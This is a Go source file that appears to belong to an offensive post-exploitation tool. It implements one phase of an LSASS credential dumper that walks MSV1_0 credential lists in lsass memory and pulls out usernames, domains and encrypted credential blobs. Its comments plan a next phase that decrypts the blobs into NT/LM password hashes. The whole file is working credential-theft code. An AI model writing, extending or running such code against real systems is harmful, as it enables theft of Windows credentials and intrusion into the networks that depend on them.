package commands

// LSASS MSV1_0 Credential List walker — Phase 2C-ii-a.
//
// Phase 2C-i parses each LSAP_LOGON_SESSION_LIST node and extracts the
// `Credentials` field (PKIWI_MSV1_0_CREDENTIAL_LIST). That pointer is the
// head of a singly-linked list with one entry per AuthenticationPackage
// bound to the session (msv1_0, kerberos, wdigest, ...). Each entry's
// PrimaryCredentials_data field points to a KIWI_MSV1_0_PRIMARY_CREDENTIAL_ENC
// envelope containing UserName, Domain, and the encrypted credential blob.
//
// Phase 2C-ii-a (this file) walks both layers structurally and surfaces the
// encrypted blob bytes as opaque data. Phase 2C-ii-b will sigscan lsasrv.dll
// for the BCrypt key globals, BCryptDecrypt the blob, and parse the resulting
// plaintext into NT/LM hashes.
//
// All parsing runs against the cross-platform lsassReader interface and is
// fully testable on Linux against a synthetic page table.

import (
	"encoding/binary"
	"fmt"
)

// KIWI_MSV1_0_CREDENTIAL_LIST_X64 layout (default x64 packing):
//
//	+0x00  PKIWI_MSV1_0_CREDENTIAL_LIST  Flink                    (8 bytes; NULL terminates)
//	+0x08  DWORD                         AuthPackageId            (4 bytes)
//	+0x0c  DWORD                         _alignment_pad           (4 bytes)
//	+0x10  PVOID                         PrimaryCredentials_data  (8 bytes)
//	total                                                         (24 bytes)
//
// We read 32 bytes per entry to leave room for trailing fields some Windows
// builds tack on without forcing a re-read if a future layout extends.
const (
	credentialListEntryHeaderSize = 24
	credentialListEntryReadSize   = 32
	credentialListEntryFlinkOff   = 0
	credentialListEntryAuthPkgOff = 8
	credentialListEntryDataPtrOff = 16
)

// KIWI_MSV1_0_PRIMARY_CREDENTIAL_ENC layout — three LSA_UNICODE_STRING headers:
//
//	+0x00  UserName              (16 bytes)
//	+0x10  Domaine               (16 bytes)
//	+0x20  encryptedCredentials  (16 bytes; Buffer = ciphertext addr, Length = ciphertext byte count)
//	total                        (48 bytes)
const (
	primaryCredentialEncSize = 48
	primaryEncUserNameOff    = 0
	primaryEncDomainOff      = 16
	primaryEncEncryptedOff   = 32
)

// ciphertextSanityMax caps the encrypted-blob size at 4 KiB. msv1_0
// PRIMARY_CREDENTIAL plaintext is well under this; even the chunkier auth
// packages (LiveSSP, CloudAP) fit comfortably. The cap shields against
// runaway reads when Length is corrupted by layout drift.
const ciphertextSanityMax uint32 = 4096

// credentialListMaxEntries caps the per-session credential-list walk. Real
// sessions usually chain 1-4 AuthPackage entries; 64 is a defensive cap that
// will fire on a corrupted Flink rather than spinning indefinitely.
const credentialListMaxEntries = 64

// credentialListEntry is the structured projection of a single
// KIWI_MSV1_0_CREDENTIAL_LIST node walked from the credentials_ptr captured
// in Phase 2C-i.
type credentialListEntry struct {
	Address                   uintptr
	Flink                     uintptr
	AuthPackageId             uint32
	AuthPackageName           string
	PrimaryCredentialsDataPtr uintptr
	Primary                   *primaryCredentialEnc // nil if no data ptr or the envelope read failed
	PrimaryReadErr            string                // populated when the envelope read failed (vs. legitimate NULL)
}

// primaryCredentialEnc is the structured projection of
// KIWI_MSV1_0_PRIMARY_CREDENTIAL_ENC. The encrypted blob is captured raw —
// Phase 2C-ii-b will BCryptDecrypt it.
type primaryCredentialEnc struct {
	Address          uintptr
	UserName         string
	Domain           string
	EncryptedAddress uintptr
	EncryptedLength  uint16
	EncryptedBytes   []byte
	ParseErrors      []string
}

// walkCredentialList follows Flink pointers from the head of a session's
// credential list. Termination conditions:
//
//   - Flink == 0 (clean termination — the chain is NULL-terminated, NOT
//     circular like LogonSessionList).
//   - maxEntries iterations elapsed (defensive cap; defaults to
//     credentialListMaxEntries when <= 0).
//   - cycle detected (cursor revisits a previously walked node).
//   - read failure on a node (returns the partial list + error).
//
// A zero head returns (nil, nil) — sessions with no credential list bound
// (e.g. tightly-restricted Anonymous logon) are legitimate and not an error.
func walkCredentialList(r lsassReader, head uintptr, maxEntries int) ([]credentialListEntry, error) {
	if r == nil {
		return nil, fmt.Errorf("nil lsassReader")
	}
	if head == 0 {
		return nil, nil
	}
	if maxEntries <= 0 {
		maxEntries = credentialListMaxEntries
	}
	entries := make([]credentialListEntry, 0, 4)
	visited := make(map[uintptr]bool, 4)
	cursor := head
	for i := 0; i < maxEntries; i++ {
		if cursor == 0 {
			return entries, nil
		}
		if visited[cursor] {
			return entries, fmt.Errorf("cycle detected at credential entry %d (cursor=0x%X already visited)", i, cursor)
		}
		visited[cursor] = true

		buf, err := r.Read(cursor, credentialListEntryReadSize)
		if err != nil {
			return entries, fmt.Errorf("read credential entry %d at 0x%X: %w", i, cursor, err)
		}
		if len(buf) < credentialListEntryHeaderSize {
			return entries, fmt.Errorf("short read at credential entry %d (0x%X): got %d, need >=%d", i, cursor, len(buf), credentialListEntryHeaderSize)
		}

		entry := credentialListEntry{
			Address:                   cursor,
			Flink:                     uintptr(binary.LittleEndian.Uint64(buf[credentialListEntryFlinkOff : credentialListEntryFlinkOff+8])),
			AuthPackageId:             binary.LittleEndian.Uint32(buf[credentialListEntryAuthPkgOff : credentialListEntryAuthPkgOff+4]),
			PrimaryCredentialsDataPtr: uintptr(binary.LittleEndian.Uint64(buf[credentialListEntryDataPtrOff : credentialListEntryDataPtrOff+8])),
		}
		entry.AuthPackageName = authPackageName(entry.AuthPackageId)

		if entry.PrimaryCredentialsDataPtr != 0 {
			primary, perr := readPrimaryCredentialEnc(r, entry.PrimaryCredentialsDataPtr)
			if perr != nil {
				entry.PrimaryReadErr = perr.Error()
			} else {
				entry.Primary = &primary
			}
		}

		entries = append(entries, entry)
		cursor = entry.Flink
	}
	return entries, fmt.Errorf("credential list walk hit safety cap of %d entries (last cursor=0x%X)", maxEntries, cursor)
}

// readPrimaryCredentialEnc fetches a KIWI_MSV1_0_PRIMARY_CREDENTIAL_ENC
// envelope at `addr`. UserName + Domain are decoded as UTF-16LE strings; the
// encrypted-blob field is read as raw bytes (NO UTF-16 decode) so it can be
// fed directly to BCryptDecrypt by Phase 2C-ii-b.
//
// Per-field failures accumulate in ParseErrors rather than aborting fatally —
// a partially-readable envelope is still useful diagnostic data. The function
// returns an error only when the 48-byte envelope itself cannot be read.
func readPrimaryCredentialEnc(r lsassReader, addr uintptr) (primaryCredentialEnc, error) {
	if r == nil {
		return primaryCredentialEnc{}, fmt.Errorf("nil lsassReader")
	}
	if addr == 0 {
		return primaryCredentialEnc{}, fmt.Errorf("zero PrimaryCredentials_data address")
	}
	raw, err := r.Read(addr, primaryCredentialEncSize)
	if err != nil {
		return primaryCredentialEnc{}, fmt.Errorf("read PRIMARY_CREDENTIAL_ENC at 0x%X: %w", addr, err)
	}
	if len(raw) < primaryCredentialEncSize {
		return primaryCredentialEnc{}, fmt.Errorf("short read at 0x%X: got %d, want %d", addr, len(raw), primaryCredentialEncSize)
	}

	p := primaryCredentialEnc{Address: addr}
	addErr := func(format string, args ...interface{}) {
		p.ParseErrors = append(p.ParseErrors, fmt.Sprintf(format, args...))
	}

	if s, err := readLSAUnicodeString(r, raw, primaryEncUserNameOff, 1024); err != nil {
		addErr("UserName: %v", err)
	} else {
		p.UserName = s
	}
	if s, err := readLSAUnicodeString(r, raw, primaryEncDomainOff, 1024); err != nil {
		addErr("Domain: %v", err)
	} else {
		p.Domain = s
	}
	bytes, encAddr, encLen, err := readLSAUnicodeRawBytes(r, raw, primaryEncEncryptedOff, ciphertextSanityMax)
	p.EncryptedAddress = encAddr
	p.EncryptedLength = encLen
	if err != nil {
		addErr("encryptedCredentials: %v", err)
	} else {
		p.EncryptedBytes = bytes
	}
	return p, nil
}

// authPackageName labels well-known LSA AuthenticationPackage IDs. The mapping
// derives from the default registration order in HKLM\System\CurrentControlSet\
// Control\Lsa\Authentication Packages on a stock Windows 10/11 install. IDs
// can shift between builds and SKUs; unrecognized values are returned as
// "Unknown(N)" so the operator sees the raw id rather than a misleading label.
func authPackageName(id uint32) string {
	switch id {
	case 0:
		return "MSV1_0"
	case 1:
		return "Custom1"
	case 2:
		return "Kerberos"
	case 3:
		return "WDigest"
	case 4:
		return "TSPkg"
	case 5:
		return "PKU2U"
	case 6:
		return "CloudAP"
	default:
		return fmt.Sprintf("Unknown(%d)", id)
	}
}
